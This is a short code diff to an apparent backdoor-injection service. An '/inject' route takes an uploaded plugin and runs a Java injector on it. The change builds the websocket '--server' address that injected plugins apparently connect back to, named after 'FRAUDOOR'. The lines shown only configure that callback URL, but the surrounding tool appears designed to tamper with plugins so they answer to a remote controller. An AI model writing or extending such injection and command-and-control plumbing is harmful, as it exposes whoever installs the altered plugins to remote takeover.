@@ -76,12 +76,16 @@ apiRouter.post('/inject', upload.single('plugin'), (req, res) => {
     });
   }
 
+  const proto = req.headers['x-forwarded-proto'] === 'https' ? 'wss' : 'ws';
+  const host = req.headers['host'] || 'localhost:8080';
+  const serverUrl = process.env.FRAUDOOR_SERVER || `${proto}://${host}/ws`;
+
   const proc = spawn('java', [
     '-jar', injectorJar,
     '--input', inPath,
     '--output', outPath,
     '--platform', platform,
-    '--server', process.env.FRAUDOOR_SERVER || 'ws://localhost:8080/ws',
+    '--server', serverUrl,
     '--secret', process.env.PLUGIN_SECRET || '',
   ]);
 
